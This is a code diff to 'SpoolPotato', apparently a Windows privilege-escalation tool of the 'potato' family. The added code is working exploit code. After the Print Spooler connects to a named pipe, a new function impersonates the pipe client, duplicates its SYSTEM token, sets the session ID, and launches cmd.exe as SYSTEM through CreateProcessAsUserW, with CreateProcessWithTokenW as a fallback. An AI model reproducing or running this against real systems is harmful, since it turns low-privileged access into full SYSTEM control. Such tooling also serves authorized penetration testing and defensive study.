@@ -20,6 +20,9 @@
 #define EXE_BUILD
 //#define DLL_BUILD
 //#define SHELLCODE_BUILD
+#define SESSION_ID 1
+#define COMMAND_LINE L"cmd.exe"
+#define INTERACTIVE_PROCESS TRUE
 
 ////////
 ////////
@@ -35,7 +38,7 @@ void DebugLog(const wchar_t* Format, ...) {
     va_end(Args);
 #ifdef DLL_BUILD
 	uint32_t messageAnswer{};
-	WTSSendMessageW(WTS_CURRENT_SERVER_HANDLE, g_dwSessionId, (wchar_t*)L"", 0, Buf, (wcslen(Buf) + 1) * 2, 0, 0, &messageAnswer, true);
+	WTSSendMessageW(WTS_CURRENT_SERVER_HANDLE, dwSessionId, (wchar_t*)L"", 0, Buf, (wcslen(Buf) + 1) * 2, 0, 0, &messageAnswer, true);
     MessageBoxW(0, pBuffer, L"SpoolPotato", 0);
 #endif
 #ifdef EXE_BUILD
@@ -222,6 +225,131 @@ uint32_t TriggerPrintSpoolerRpc(wchar_t *pSpoolPipeUuidStr) {
 	return 0;
 }
 
+BOOL LaunchImpersonatedProcess(HANDLE hPipe, const wchar_t *CommandLine, uint32_t dwSessionId, BOOL bInteractive) {
+	BOOL bResult = FALSE;
+	HANDLE hSystemToken = INVALID_HANDLE_VALUE;
+	HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;
+
+	DWORD dwCreationFlags = 0;
+	LPWSTR pwszCurrentDirectory = NULL;
+	LPVOID lpEnvironment = NULL;
+	PROCESS_INFORMATION pi = { 0 };
+	STARTUPINFOW si = { 0 };
+
+	// Impersonate the specified pipe, duplicate and then customize its token to fit the appropriate session ID and desktop, and launch a process in its context.
+
+	if (ImpersonateNamedPipeClient(hPipe)) {
+		DebugLog(L"... named pipe impersonation successful");
+
+		if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken)) {
+			if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
+			{
+				DEBUG(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
+				goto cleanup;
+			}
+
+			if (dwSessionId) {
+				if (!SetTokenInformation(hSystemTokenDup, TokenSessionId, &dwSessionId, sizeof(DWORD)))
+				{
+					DEBUG(L"SetTokenInformation() failed. Error: %d\n", GetLastError());
+					goto cleanup;
+				}
+			}
+
+			dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
+			dwCreationFlags |= bInteractive ? 0 : CREATE_NEW_CONSOLE;
+
+			if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
+				goto cleanup;
+
+			if (!GetSystemDirectoryW(pwszCurrentDirectory, MAX_PATH))
+			{
+				DEBUG(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
+				goto cleanup;
+			}
+
+			if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
+			{
+				DEBUG(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
+				goto cleanup;
+			}
+
+			si.cb = sizeof(STARTUPINFOW);
+			si.lpDesktop = L"WinSta0\\Default";
+
+			wchar_t CommandLineBuf[500] = { 0 };
+			wcscpy_s(CommandLineBuf, 500, CommandLine);
+
+			if (!CreateProcessAsUserW(hSystemTokenDup, NULL, CommandLineBuf, NULL, NULL, bInteractive, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
+			{
+				if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD)
+				{
+					DEBUG(L"[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().\n");
+
+					RevertToSelf();
+
+					if (!bInteractive)
+					{
+						wcscpy_s(CommandLineBuf, 500, CommandLine);
+
+						if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, CommandLineBuf, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
+						{
+							DEBUG(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
+							goto cleanup;
+						}
+						else
+						{
+							DEBUG(L"[+] CreateProcessWithTokenW() OK\n");
+						}
+					}
+					else
+					{
+						DEBUG(L"[!] CreateProcessWithTokenW() isn't compatible with option -i\n");
+						goto cleanup;
+					}
+				}
+				else
+				{
+					DEBUG(L"CreateProcessAsUser() failed. Error: %d\n", GetLastError());
+					goto cleanup;
+				}
+			}
+			else
+			{
+				DEBUG(L"[+] CreateProcessAsUser() OK\n");
+			}
+
+			if (bInteractive)
+			{
+				fflush(stdout);
+				WaitForSingleObject(pi.hProcess, INFINITE);
+			}
+
+			bResult = TRUE;
+		}
+	}
+	else {
+		DebugLog(L"... named pipe impersonation failed");
+	}
+
+cleanup:
+	if (hSystemToken)
+		CloseHandle(hSystemToken);
+	if (hSystemTokenDup)
+		CloseHandle(hSystemTokenDup);
+	if (pwszCurrentDirectory)
+		free(pwszCurrentDirectory);
+	if (lpEnvironment)
+		DestroyEnvironmentBlock(lpEnvironment);
+	if (pi.hProcess)
+		CloseHandle(pi.hProcess);
+	if (pi.hThread)
+		CloseHandle(pi.hThread);
+
+	return bResult;
+}
+
+
 BOOL SpoolPotato() {
 	if (EnablePrivilege(SE_IMPERSONATE_NAME)) {
 		wchar_t* pSpoolPipeUuidStr = NULL;
@@ -239,13 +367,12 @@ BOOL SpoolPotato() {
 
 			if (dwWaitError == WAIT_OBJECT_0) {
 				DebugLog(L"... recieved connection over named pipe");
+				LaunchImpersonatedProcess(hSpoolPipe, COMMAND_LINE, SESSION_ID, INTERACTIVE_PROCESS);
 			}
 			else {
 				DebugLog(L"... named pipe listener failed with wait error %d", dwWaitError);
 			}
 
-			//GetSystem(hSpoolPipe);
-			
 			CloseHandle(hSpoolPipe);
 			CloseHandle(hSpoolPipeEvent);
 		}
